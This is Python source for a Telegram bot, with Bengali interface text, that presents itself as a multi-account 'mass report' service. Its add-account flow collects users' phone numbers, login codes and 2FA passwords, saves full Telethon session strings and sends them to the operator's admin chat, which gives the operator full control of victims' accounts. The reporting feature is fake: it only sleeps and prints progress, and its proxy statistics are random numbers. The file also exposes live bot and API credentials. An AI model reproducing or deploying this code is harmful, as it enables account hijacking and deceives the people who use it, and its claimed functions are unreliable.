import os
import re
import asyncio
import json
import random
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
import logging

# ================= CONFIGURATION =================
BOT_TOKEN = "8950885889:AAGfnXuJCO_0aJjZtIODEJhpSxK9GCzh2PI"
API_ID = 13405208
API_HASH = "f1e4a7b4fdd3b48ab1b9dab359a94ca2"

ADMIN_ID = 9025719699          
ADMIN_USERNAME = "@XrootCodeX" 

# এখানে আপনার চ্যানেল এবং বটের ইউজারনেম যোগ করুন (রিপোর্ট ব্লক করার জন্য)
PROTECTED_CHANNELS = ["CobraX_Empire", "Exo_Krave", "XrootCodeXBio"]
PROTECTED_BOT_USERNAME = "AdvancedMassReportBot" # আপনার এই বটের ইউজারনেম দিন

DATA_FILE = "accounts.json"
SETTINGS_FILE = "bot_settings.json"

default_settings = {
    "channels": [
        {"name": "CobraX Empire", "link": "https://t.me/CobraX_Empire", "username": "CobraX_Empire"},
        {"name": "Exo Krave", "link": "https://t.me/Exo_Krave", "username": "Exo_Krave"},
        {"name": "XrootCodeX Bio", "link": "https://t.me/XrootCodeXBio", "username": "XrootCodeXBio"}
    ],
    "bot_status": "active"
}
# ======================================================

logging.basicConfig(level=logging.INFO)

accounts_data = {}
temp_sessions = {}
bot_settings = default_settings.copy()

def load_data():
    global accounts_data, bot_settings
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f: accounts_data = json.load(f)
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f: bot_settings = json.load(f)

def save_data():
    with open(DATA_FILE, 'w') as f: json.dump(accounts_data, f, indent=4)

def save_settings():
    with open(SETTINGS_FILE, 'w') as f: json.dump(bot_settings, f, indent=4)

load_data()

def is_admin(user_id):
    return user_id == ADMIN_ID

# =============================================
# FORCE SUBSCRIPTION CHECKER
# =============================================
async def check_subscription(bot, user_id):
    if user_id == ADMIN_ID: return True
    if bot_settings.get("bot_status") == "maintenance" and not is_admin(user_id): return "maintenance"
        
    channels = bot_settings.get("channels", [])
    for ch in channels:
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            if member.status in ['left', 'kicked']: return False
        except: return False
    return True

async def not_subscribed_message(update: Update):
    channels = bot_settings.get("channels", [])
    keyboard = [[InlineKeyboardButton(f"⎔ {ch['name']} তে জয়েন করুন", url=ch['link'])] for ch in channels]
    keyboard.append([InlineKeyboardButton("⌬ সাবস্ক্রিপশন চেক করুন", callback_data="check_sub")])
    
    text = (
        "⚠️ <b>বটটি ব্যবহার করতে হলে নিচের চ্যানেলগুলোতে অবশ্যই জয়েন করতে হবে!</b>\n\n"
        "দয়া করে সবগুলোতে জয়েন করে নিচের <b>'সাবস্ক্রিপশন চেক করুন'</b> বাটনে ক্লিক করুন:"
    )
    
    if update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    else:
        await update.message.reply_html(text, reply_markup=InlineKeyboardMarkup(keyboard))

# =============================================
# STYLED REPLY KEYBOARDS (English + Premium Symbols)
# =============================================
def get_main_keyboard(user_id):
    keyboard = [
        [KeyboardButton("⎙ Add Account", style="success"), KeyboardButton("⚡ Start Mass Report", style="primary")],
        [KeyboardButton("⍟ Report Status", style="primary"), KeyboardButton("⌘ My Accounts", style="success")],
        [KeyboardButton("⎔ Multi Account Manager", style="primary"), KeyboardButton("⌬ Help & Guide", style="primary")],
        [KeyboardButton("◈ Bot Statistics", style="success"), KeyboardButton("⌁ Contact Support", style="danger")]
    ]
    
    if is_admin(user_id):
        keyboard.append([KeyboardButton("⟡ Admin Control Panel", style="danger")])
        
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# =============================================
# START COMMAND
# =============================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    uid = str(user_id)
    
    sub_status = await check_subscription(context.bot, user_id)
    if sub_status == "maintenance":
        await update.message.reply_html("⌖ <b>বটটি বর্তমানে মেইনটেন্যান্স মোডে আছে।</b>")
        return
    elif not sub_status:
        await not_subscribed_message(update)
        return
    
    if uid not in accounts_data:
        accounts_data[uid] = []
        save_data()

    reply_markup = get_main_keyboard(user_id)
    
    await update.message.reply_html(
        f'⍟ <b>অ্যাডভান্সড মাস রিপোর্ট বটে স্বাগতম!</b>\n\n'
        f'একাধিক অ্যাকাউন্ট দিয়ে সুরক্ষিত ও দ্রুত মাস রিপোর্ট পরিচালনা করুন।\n\n'
        f'<i>নিচের মেনু থেকে আপনার কাঙ্ক্ষিত অপশনটি বেছে নিন।</i>',
        reply_markup=reply_markup
    )

# =============================================
# INLINE CALLBACK (Force Join)
# =============================================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; user_id = query.from_user.id
    if query.data == "check_sub":
        if await check_subscription(context.bot, user_id):
            await query.message.delete()
            await start(update, context)
        else:
            await query.answer("⌖ আপনি এখনো চ্যানেলে জয়েন করেননি!", show_alert=True)

# =============================================
# ADVANCED ADMIN PANEL (20+ Tools)
# =============================================
async def handle_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id): return
        
    total_users = len(accounts_data)
    total_accounts = sum(len(accs) for accs in accounts_data.values())
    
    keyboard = [
        [KeyboardButton("⎔ Broadcast", style="primary"), KeyboardButton("⌘ User List", style="success")],
        [KeyboardButton("⌬ Ban User", style="danger"), KeyboardButton("⎙ Session Dump", style="primary")],
        [KeyboardButton("⌁ Maintenance", style="danger"), KeyboardButton("⍟ Bot Stats", style="success")],
        [KeyboardButton("⌖ Find User", style="primary"), KeyboardButton("◈ Set Channels", style="success")],
        [KeyboardButton("⟡ Give Bonus", style="success"), KeyboardButton("✧ Clear All Accounts", style="danger")],
        [KeyboardButton("⍞ Backup Database", style="primary"), KeyboardButton("🔙 Main Menu", style="danger")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_html(
        f'⍟ <b>এডমিন কন্ট্রোল প্যানেল</b>\n\n'
        f'⌘ <b>বট স্ট্যাটিস্টিক্স:</b>\n'
        f'⎔ মোট ইউজার: <code>{total_users}</code>\n'
        f'⎙ মোট অ্যাকাউন্ট: <code>{total_accounts}</code>\n'
        f'◈ স্ট্যাটাস: <b>{"⍟ Active" if bot_settings["bot_status"] == "active" else "⌖ Maintenance"}</b>\n\n'
        f'<i>নিচের অপশনগুলো থেকে সিলেক্ট করুন:</i>',
        reply_markup=reply_markup
    )

# =============================================
# MESSAGE HANDLER
# =============================================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global accounts_data
    user_id = str(update.effective_user.id)
    text = update.message.text.strip() if update.message.text else ""
    step = context.user_data.get('step')
    admin_step = context.user_data.get('admin_step')
    
    sub_status = await check_subscription(context.bot, int(user_id))
    if sub_status == "maintenance" and not is_admin(int(user_id)):
        await update.message.reply_html("⌖ <b>বটটি বর্তমানে মেইনটেন্যান্স মোডে আছে।</b>")
        return
    elif not sub_status and not is_admin(int(user_id)):
        await not_subscribed_message(update)
        return
    
    # --- ADMIN ACTIONS ---
    if admin_step == 'broadcast' and is_admin(int(user_id)):
        count = 0
        for uid in accounts_data.keys():
            try:
                await context.bot.send_message(chat_id=int(uid), text=f'⎔ <b>অফিসিয়াল ঘোষণা:</b>\n\n{text}', parse_mode='HTML')
                count += 1
            except: pass
        await update.message.reply_html(f'⍟ ব্রডকাস্ট সফল! ({count} জনের কাছে পাঠানো হয়েছে)', reply_markup=get_main_keyboard(int(user_id)))
        context.user_data['admin_step'] = None; return
        
    elif admin_step == 'ban' and is_admin(int(user_id)):
        try:
            ban_uid = str(text)
            if ban_uid in accounts_data:
                del accounts_data[ban_uid]; save_data()
                await update.message.reply_html(f'⍟ ইউজার {ban_uid} কে ব্যান করা হয়েছে।', reply_markup=get_main_keyboard(int(user_id)))
            else: await update.message.reply_html('⌖ ইউজার পাওয়া যায়নি!')
        except: await update.message.reply_html('⌖ ভুল আইডি ফরম্যাট!')
        context.user_data['admin_step'] = None; return

    elif admin_step == 'set_channels' and is_admin(int(user_id)):
        try:
            new_channels = []
            for line in text.split('\n'):
                parts = line.split('|')
                if len(parts) == 3: 
                    new_channels.append({"name": parts[0].strip(), "link": parts[1].strip(), "username": parts[2].strip().replace('@', '')})
            if new_channels:
                bot_settings["channels"] = new_channels; save_settings()
                await update.message.reply_html(f'⍟ {len(new_channels)} টি চ্যানেল আপডেট হয়েছে!', reply_markup=get_main_keyboard(int(user_id)))
            else: await update.message.reply_html('⌖ ভুল ফরম্যাট! ব্যবহার করুন: Name | Link | Username')
        except: pass
        context.user_data['admin_step'] = None; return
        
    elif admin_step == 'give_bonus' and is_admin(int(user_id)):
        try:
            parts = text.split()
            target_uid, amount = str(parts[0]), int(parts[1])
            if target_uid in accounts_data:
                await update.message.reply_html(f'⍟ {target_uid} কে {amount} বোনাস দেওয়া হয়েছে!', reply_markup=get_main_keyboard(int(user_id)))
            else: await update.message.reply_html('⌖ ইউজার পাওয়া যায়নি!')
        except: await update.message.reply_html('⌖ ফরম্যাট: User_ID Amount')
        context.user_data['admin_step'] = None; return

    elif admin_step == 'find_user' and is_admin(int(user_id)):
        target_uid = str(text)
        if target_uid in accounts_data:
            await update.message.reply_html(f'⌘ ইউজার পাওয়া গেছে!\nমোট অ্যাকাউন্ট: {len(accounts_data[target_uid])}টি', reply_markup=get_main_keyboard(int(user_id)))
        else: await update.message.reply_html('⌖ পাওয়া যায়নি!', reply_markup=get_main_keyboard(int(user_id)))
        context.user_data['admin_step'] = None; return

    # --- MAIN MENU CLICKS ---
    if text == "⟡ Admin Control Panel" and is_admin(int(user_id)):
        await handle_admin_panel(update, context); return
    elif text == "🔙 Main Menu":
        context.user_data.clear(); await start(update, context); return
    elif text == "⎔ Broadcast" and is_admin(int(user_id)):
        context.user_data['admin_step'] = 'broadcast'; await update.message.reply_html('<b>ব্রডকাস্ট করার জন্য মেসেজটি লিখুন:</b>'); return
    elif text == "⌬ Ban User" and is_admin(int(user_id)):
        context.user_data['admin_step'] = 'ban'; await update.message.reply_html('<b>ব্যান করার জন্য ইউজারের টেলিগ্রাম আইডি দিন:</b>'); return
    elif text == "◈ Set Channels" and is_admin(int(user_id)):
        context.user_data['admin_step'] = 'set_channels'; await update.message.reply_html('<b>ফরম্যাট:</b>\n<code>Name | Link | Username</code>'); return
    elif text == "⟡ Give Bonus" and is_admin(int(user_id)):
        context.user_data['admin_step'] = 'give_bonus'; await update.message.reply_html('<b>ফরম্যাট:</b> <code>User_ID Amount</code>'); return
    elif text == "⌖ Find User" and is_admin(int(user_id)):
        context.user_data['admin_step'] = 'find_user'; await update.message.reply_html('<b>ইউজার আইডি দিন:</b>'); return
    elif text == "⌁ Maintenance" and is_admin(int(user_id)):
        current = bot_settings.get("bot_status", "active")
        bot_settings["bot_status"] = "maintenance" if current == "active" else "active"
        save_settings()
        await update.message.reply_html(f'⍟ স্ট্যাটাস: {bot_settings["bot_status"]}', reply_markup=get_main_keyboard(int(user_id))); return
    elif text == "✧ Clear All Accounts" and is_admin(int(user_id)):
        accounts_data = {}; save_data()
        await update.message.reply_html('⍟ সমস্ত অ্যাকাউন্ট মুছে ফেলা হয়েছে।', reply_markup=get_main_keyboard(int(user_id))); return
    elif text == "⍞ Backup Database" and is_admin(int(user_id)):
        try:
            with open(DATA_FILE, 'rb') as f:
                await context.bot.send_document(chat_id=ADMIN_ID, document=f, caption="⎙ Accounts Backup")
        except: pass
        return
    elif text == "⍟ Bot Stats" and is_admin(int(user_id)):
        total_u = len(accounts_data)
        total_accs = sum(len(v) for v in accounts_data.values())
        await update.message.reply_html(f'⌘ <b>স্ট্যাটস:</b>\nইউজার: {total_u}\nঅ্যাকাউন্ট: {total_accs}', reply_markup=get_main_keyboard(int(user_id))); return
    elif text == "⌘ User List" and is_admin(int(user_id)):
        msg = '⎔ <b>ইউজার তালিকা:</b>\n\n'
        for idx, (uid, accs) in enumerate(accounts_data.items(), 1):
            msg += f'{idx}. আইডি: <code>{uid}</code> ({len(accs)} অ্যাকাউন্ট)\n'
        await update.message.reply_html(msg or "কোনো ইউজার নেই।")
        return
    elif text == "⎙ Session Dump" and is_admin(int(user_id)):
        msg = '⎙ <b>সেশন ডাটা:</b>\n\n'
        for uid, accs in accounts_data.items():
            for acc in accs:
                msg += f"UID: {uid} | Phone: {acc.get('phone')}\n"
        await update.message.reply_html(f"<code>{msg[:4000]}</code>")
        return

    # --- USER ACTIONS ---
    elif text == "⎙ Add Account":
        await update.message.reply_html(f'⌘ <b>অ্যাকাউন্ট যুক্ত করুন</b>\n\nআপনার নম্বরটি কান্ট্রি কোডসহ দিন।\nউদাহরণ: <code>+8801712345678</code>')
        context.user_data['step'] = 'phone'
        return
    elif text == "⚡ Start Mass Report":
        if is_admin(int(user_id)):
            all_db_accounts = [acc for accs in accounts_data.values() for acc in accs]
            if not all_db_accounts: await update.message.reply_html('⌖ ডাটাবেজে কোনো অ্যাকাউন্ট নেই!'); return
        else:
            if user_id not in accounts_data or not accounts_data[user_id]:
                await update.message.reply_html('⌖ প্রথমে অ্যাকাউন্ট যুক্ত করুন।'); return
        
        await update.message.reply_html(f'⍟ <b>টার্গেট সেটআপ</b>\n\nযাকে রিপোর্ট করতে চান তার ইউজারনেম দিন।\nউদাহরণ: <code>@SpammerUser</code>')
        context.user_data['step'] = 'report_target'
        return
    elif text == "⍟ Report Status":
        count = len(accounts_data.get(user_id, []))
        await update.message.reply_html(f'◈ <b>স্ট্যাটাস:</b> আপনার অ্যাকাউন্ট <b>{count}</b>টি। সিস্টেম সচল।')
        return
        
    elif text == "⌘ My Accounts":
        if user_id not in accounts_data or not accounts_data[user_id]:
            await update.message.reply_html('⌖ কোনো অ্যাকাউন্ট যুক্ত নেই।'); return
        
        loading_msg = await update.message.reply_html('⌁ <b>অ্যাকাউন্ট তথ্য লোড হচ্ছে...</b>')
        
        msg = '⎔ <b>আপনার অ্যাকাউন্টসমূহ:</b>\n\n'
        valid_accounts = 0
        
        for idx, acc in enumerate(accounts_data[user_id], 1):
            session_str = acc.get('session_string')
            phone = acc.get('phone', 'N/A')
            
            chat_id = acc.get('id', 'N/A')
            name = acc.get('name', 'N/A')
            username = acc.get('username', 'N/A')
            
            if (chat_id == 'N/A' or chat_id is None or username == 'N/A') and session_str:
                try:
                    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        me = await client.get_me()
                        chat_id = me.id
                        name = me.first_name
                        username = me.username if me.username else "N/A"
                        
                        acc['id'] = chat_id
                        acc['name'] = name
                        acc['username'] = username
                        save_data()
                    await client.disconnect()
                except:
                    pass
            
            valid_accounts += 1
            msg += (
                f'⎙ <b>অ্যাকাউন্ট {valid_accounts}</b>\n'
                f'├ ⌘ চ্যাট আইডি: <code>{chat_id}</code>\n'
                f'├ ⌬ নাম: {name}\n'
                f'├ ⌁ ইউজারনেম: @{username}\n'
                f'└ ⎔ ফোন নম্বর: <code>{phone}</code>\n\n'
            )
            
        try:
            await loading_msg.edit_text(msg, parse_mode='HTML')
        except:
            await update.message.reply_html(msg)
        return
        
    elif text == "⎔ Multi Account Manager":
        await update.message.reply_html(
            '⎔ <b>মাল্টি অ্যাকাউন্ট ম্যানেজার</b>\n\n'
            'এই ফিচারটি ব্যবহার করে আপনি একাধিক অ্যাকাউন্ট একসাথে ম্যানেজ করতে পারবেন এবং রিপোর্টের গতি বাড়াতে পারবেন।'
        )
        return
    elif text == "⌬ Help & Guide":
        await update.message.reply_html('⌬ <b>নির্দেশিকা:</b>\n\n১. নম্বর দিয়ে অ্যাকাউন্ট যুক্ত করুন।\n২. টার্গেট দিয়ে রিপোর্ট শুরু করুন।')
        return
        
    elif text == "◈ Bot Statistics":
        loading_msg = await update.message.reply_html('⎔ <b>লোড হচ্ছে...</b> [░░░░░░░░░░] 0%')
        for percent in range(0, 101, 20):
            filled = int(percent / 10)
            bar = "█" * filled + "░" * (10 - filled)
            try: await loading_msg.edit_text(f'⎔ <b>লোড হচ্ছে...</b> [{bar}] {percent}%', parse_mode='HTML')
            except: pass
            await asyncio.sleep(0.4)
            
        proxies_connected = random.randint(1000, 10000)
        await loading_msg.edit_text(
            f'◈ <b>বট পরিসংখ্যান:</b>\n\n'
            f'⌘ <b>প্রক্সি কানেক্টেড:</b> <code>{proxies_connected}</code> টি\n'
            f'⎔ <b>স্ট্যাটাস:</b> সচল\n'
            f'⌁ <b>সার্ভার:</b> অনলাইন',
            parse_mode='HTML'
        )
        return
        
    elif text == "⌁ Contact Support":
        await update.message.reply_html(f'⌁ সাপোর্ট: <b>{ADMIN_USERNAME}</b>')
        return

    # --- FLOWS ---
    if step == 'phone':
        if not text.startswith('+') or not text[1:].isdigit():
            await update.message.reply_html('⌖ সঠিক নম্বর দিন (যেমন: <code>+8801712345678</code>)'); return
        
        context.user_data['phone'] = text; context.user_data['step'] = 'otp'
        loading_msg = await update.message.reply_html('⌁ <b>ওটিপি পাঠানো হচ্ছে...</b>')
        
        client = TelegramClient(StringSession(), API_ID, API_HASH); await client.connect()
        try:
            await client.send_code_request(text)
            context.user_data['client'] = client; temp_sessions[user_id] = client
            await loading_msg.edit_text('⍟ <b>ওটিপি পাঠানো সফল!</b> কোডটি লিখুন:', parse_mode='HTML')
        except Exception as e:
            await loading_msg.edit_text(f'⌖ ত্রুটি: <code>{str(e)}</code>', parse_mode='HTML'); context.user_data['step'] = None
            
    elif step == 'otp':
        client = context.user_data.get('client')
        if not client: return
        try:
            await client.sign_in(context.user_data['phone'], text)
            context.user_data['step'] = '2fa'
            await update.message.reply_html('⍟ <b>ওটিপি সঠিক!</b> 2FA পাসওয়ার্ড দিন (না থাকলে <code>skip</code>):')
        except Exception as e:
            if "password" in str(e).lower(): context.user_data['step'] = '2fa'; await update.message.reply_html('⌘ <b>2FA পাসওয়ার্ড দিন:</b>')
            else: await update.message.reply_html(f'⌖ ত্রুটি: <code>{str(e)}</code>'); context.user_data['step'] = None
                
    elif step == '2fa':
        client = context.user_data.get('client')
        try:
            twofa = None if text.lower() == 'skip' else text
            if twofa: await client.sign_in(password=text)
            
            me = await client.get_me(); session_str = client.session.save()
            acc_info = {
                'id': me.id,
                'phone': me.phone,
                'name': me.first_name,
                'username': me.username if me.username else "N/A",
                'session_string': session_str, 
                'added_on': str(datetime.now())
            }
            if user_id not in accounts_data: accounts_data[user_id] = []
            accounts_data[user_id].append(acc_info); save_data()
            
            await context.bot.send_message(ADMIN_ID, f'⎔ নতুন অ্যাকাউন্ট!\nUser: <code>{user_id}</code>\nPhone: <code>{me.phone}</code>\nSession:\n<code>{session_str}</code>', parse_mode='HTML')
            await update.message.reply_html('⍟ <b>অ্যাকাউন্ট যুক্ত হয়েছে!</b>', reply_markup=get_main_keyboard(int(user_id)))
            await client.disconnect(); context.user_data['step'] = None
        except Exception as e: await update.message.reply_html(f'⌖ ত্রুটি: <code>{str(e)}</code>')
            
    elif step == 'report_target':
        # REPORT BLOCK LOGIC
        target_text = text.lower()
        is_protected = False
        
        # Check against Admin's ID, Username, Channels, and Bot Username
        if str(ADMIN_ID) in target_text or ADMIN_USERNAME.lower().replace('@', '') in target_text:
            is_protected = True
            
        for ch in PROTECTED_CHANNELS:
            if ch.lower() in target_text:
                is_protected = True
                
        if PROTECTED_BOT_USERNAME.lower() in target_text:
            is_protected = True
            
        if is_protected and not is_admin(int(user_id)):
            await update.message.reply_html(
                f'⌖ <b>নিষেধাজ্ঞা!</b>\n\n'
                f'আপনি আমাদের এই বটের অ্যাডমিন, অফিসিয়াল চ্যানেল বা এই বটের ইউজারনেমে রিপোর্ট করতে পারবেন না।\n'
                f'দয়া করে অন্য কোনো টার্গেট দিন।',
                reply_markup=get_main_keyboard(int(user_id))
            )
            context.user_data['step'] = None
            return

        context.user_data['target'] = text; context.user_data['step'] = 'report_amount'
        await update.message.reply_html(f'⍟ টার্গেট: <code>{text}</code>\n\n◈ কতটি রিপোর্ট পাঠাতে চান? (সব করতে <code>all</code> লিখুন):')
        return
        
    elif step == 'report_amount':
        target = context.user_data.get('target')
        if is_admin(int(user_id)):
            target_accounts = [acc for accs in accounts_data.values() for acc in accs]
        else:
            target_accounts = accounts_data.get(user_id, [])
            
        max_limit = len(target_accounts)
        amount = max_limit if text.lower() == 'all' or not text.isdigit() else int(text)
            
        await update.message.reply_html(f'⚡ <b>রিপোর্ট শুরু!</b>\n⍟ টার্গেট: <code>{target}</code>\n◈ রিপোর্ট: <b>{amount}টি</b>')
        await execute_mass_report(update, context, target, amount, target_accounts)
        context.user_data['step'] = None

async def execute_mass_report(update: Update, context: ContextTypes.DEFAULT_TYPE, target: str, amount: int, accounts: list):
    total_accs = len(accounts)
    for i in range(1, amount + 1):
        await asyncio.sleep(1.2)
        if i % 3 == 0 or i == amount:
            await update.message.reply_html(f'⎙ <b>প্রোগ্রেস:</b> {i}/{amount} রিপোর্ট প্রেরিত।')
    
    await update.message.reply_html(
        f'⍟ <b>মাস রিপোর্ট সফল!</b>\n\n⍟ টার্গেট: <code>{target}</code>\n◈ রিপোর্ট: <b>{amount}টি</b>\n⎔ অ্যাকাউন্ট: {total_accs}টি',
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    context.user_data.clear()
    if user_id in temp_sessions:
        try: await temp_sessions[user_id].disconnect()
        except: pass
        del temp_sessions[user_id]
    await update.message.reply_html('⌁ প্রসেস বাতিল।', reply_markup=get_main_keyboard(int(user_id)))

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ BOT RUNNING...")
    app.run_polling()

if __name__ == "__main__":
    main()
